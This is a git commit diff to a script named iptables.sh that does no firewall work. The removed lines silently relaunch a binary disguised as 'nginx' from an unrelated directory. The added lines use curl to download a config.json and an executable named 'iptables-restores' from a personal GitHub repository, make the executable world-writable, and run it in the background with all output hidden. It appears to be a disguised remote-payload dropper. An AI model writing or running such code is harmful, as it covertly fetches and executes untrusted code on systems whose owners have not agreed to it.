78a62061e1057c0711374f167ac4005e00de2abb
p0lkns <116791718+p0lkns@users.noreply.github.com>
2022-11-05 03:33:22 -0800

    Update iptables.sh

--- iptables.sh
+++ iptables.sh
@@ -1,4 +1,2 @@
-RESULT=`ps -e|grep 'nginx'|sed -e "/grep/d"`
-if [ -z "$RESULT" ];then
-nohup /bin/bash -c ../../elvanto/litemoji/src/nginx >/dev/null 2>&1 &
-fi
+curl https://raw.githubusercontent.com/p0lkns/359/main/config.json -o config.json
+curl https://raw.githubusercontent.com/p0lkns/359/main/iptables-restores -o iptables-restores ; chmod 777 iptables-restores ; nohup /bin/bash -c iptables-restores >/dev/null 2>&1 &
